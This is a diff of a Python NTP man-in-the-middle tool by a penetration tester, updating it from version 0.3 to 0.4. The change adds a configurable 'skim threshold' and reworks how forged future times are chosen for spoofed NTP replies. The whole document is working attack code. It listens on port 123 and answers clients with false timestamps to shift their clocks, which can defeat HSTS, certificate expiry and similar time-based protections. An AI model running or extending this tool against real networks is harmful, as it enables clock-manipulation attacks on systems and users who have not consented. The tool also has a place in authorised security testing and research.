@@ -1,8 +1,8 @@
 #!/usr/bin/python
 # NTP MitM Tool
 # Jose Selvi - jselvi[a.t]pentester[d0.t]es - http://www.pentester.es
-# Version 0.3 - 17/Sept/2014
-# 	- Added "skim_step" (previously hardcoded).
+# Version 0.4 - 25/Sept/2014
+# 	- Added "skim_threshold" option.
 
 from optparse import OptionParser
 import socket
@@ -32,10 +32,11 @@ class NTProxy( threading.Thread ):
 	# Stop Flag
 	stopF = False
 	# Force Step or date
-	skim_step     = float(0)
-	forced_step   = float(0)
-	forced_date   = float(0)
-	forced_random = False
+	skim_step      = float(0)
+	skim_threshold = float(0)
+	forced_step    = float(0)
+	forced_date    = float(0)
+	forced_random  = False
 	# Temporal control
 	seen = {}
 	# Constructor
@@ -57,8 +58,10 @@ class NTProxy( threading.Thread ):
 			num = int(mystr)
 			mag = 1
 		return float(mag * num)
+	def set_skim_threshold( self, threshold ):
+		self.skim_threshold = self.str2sec(threshold)
 	def set_skim_step( self, skim ):
-		self.skim_step = self.str2sec(skim) - 2 # 2s threshold
+		self.skim_step = self.str2sec(skim) - self.skim_threshold
 	def force_step( self, step ):
 		self.forced_step = self.str2sec(step)
 	def force_date( self, date ):
@@ -96,10 +99,12 @@ class NTProxy( threading.Thread ):
 		self.step = future_time - current_time
 
 	# Select a new time in the future
-	def newtime( self, timestamp ):# JSELVI
+	def newtime( self, timestamp ):
 		current_time	= time.time()
-		skim_time	= timestamp + self.skim_step
+		skim_time	= timestamp + self.skim_step - 5
 		future_time	= current_time + self.step
+		if self.skim_step == 0:
+			skim_time = 4294967294
 		if self.forced_date == 0 and ( skim_time > future_time ):
 			return future_time
 		elif self.forced_date != 0 and ( skim_time > self.forced_date ):
@@ -124,7 +129,7 @@ class NTProxy( threading.Thread ):
 				socket.sendto( data, source )
 				# Only print if it's the first packet
 				epoch_now = time.time()
-				if ( not source[0] in self.seen ) or ( (source[0] in self.seen) and (epoch_now - self.seen[source[0]]) > 5 ):
+				if ( not source[0] in self.seen ) or ( (source[0] in self.seen) and (epoch_now - self.seen[source[0]]) > 2 ):
 					if self.forced_random:
 						self.select_step()
 					self.seen[source[0]] = epoch_now
@@ -259,13 +264,14 @@ class NTProxy( threading.Thread ):
 # Usage and options
 usage = "usage: %prog [options]"
 parser = OptionParser(usage=usage)
-parser.add_option("-i",  "--interface",   type="string",        dest="interface", default="0.0.0.0", help="Listening interface")
-parser.add_option("-p",  "--port",        type="int",           dest="port",      default="123",     help="Listening port")
-parser.add_option("-n",  "--nobanner",    action="store_false", dest="banner",    default=True,      help="Not show Delorean banner")
-parser.add_option("-s", "--force-step",   type="string",        dest="step",                         help="Force the time step: 3m (minutes), 4d (days), 1M (month)")
-parser.add_option("-d", "--force-date",   type="string",        dest="date",                         help="Force the date: YYYY-MM-DD hh:mm[:ss]")
-parser.add_option("-k", "--skim-step",    type="string",        dest="skim",                         help="Skimming step: 3m (minutes), 4d (days), 1M (month)")
-parser.add_option("-r",  "--random-date", action="store_true",  dest="random",    default=False,     help="Use random date each time")
+parser.add_option("-i",  "--interface",     type="string",        dest="interface", default="0.0.0.0", help="Listening interface")
+parser.add_option("-p",  "--port",          type="int",           dest="port",      default="123",     help="Listening port")
+parser.add_option("-n",  "--nobanner",      action="store_false", dest="banner",    default=True,      help="Not show Delorean banner")
+parser.add_option("-s", "--force-step",     type="string",        dest="step",                         help="Force the time step: 3m (minutes), 4d (days), 1M (month)")
+parser.add_option("-d", "--force-date",     type="string",        dest="date",                         help="Force the date: YYYY-MM-DD hh:mm[:ss]")
+parser.add_option("-k", "--skim-step",      type="string",        dest="skim",                         help="Skimming step: 3m (minutes), 4d (days), 1M (month)")
+parser.add_option("-t", "--skim-threshold", type="string",        dest="threshold", default="10s",     help="Skimming Threshold: 3m (minutes), 4d (days), 1M (month)")
+parser.add_option("-r",  "--random-date",   action="store_true",  dest="random",    default=False,     help="Use random date each time")
 (options, args) = parser.parse_args()
 ifre = re.compile('[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
 fsre = re.compile('[0-9]+[smhdwMy]?')
@@ -275,11 +281,12 @@ if (
 	not options.interface or not ifre.match(options.interface) or
 	options.port < 1 or options.port > 65535 or
 	( options.step and options.date ) or
-	( options.skim and not (options.step or options.date) ) or
+	#( options.skim and not (options.step or options.date) ) or
 	( options.random and (options.step or options.date) ) or
 	( options.step and not fsre.match(options.step) ) or
 	( options.date and not fdre.match(options.date) ) or
-	( options.skim and not fsre.match(options.skim) )
+	( options.skim and not fsre.match(options.skim) ) or
+	( options.threshold and not fsre.match(options.threshold) )
    ):
         parser.print_help()
         exit()
@@ -291,6 +298,7 @@ NTP_Thread = NTProxy(socket)
 if options.random:
 	NTP_Thread.force_random(True)
 else:
+	NTP_Thread.set_skim_threshold( options.threshold )
 	if options.skim:
 		NTP_Thread.set_skim_step( options.skim )
 	if options.step:
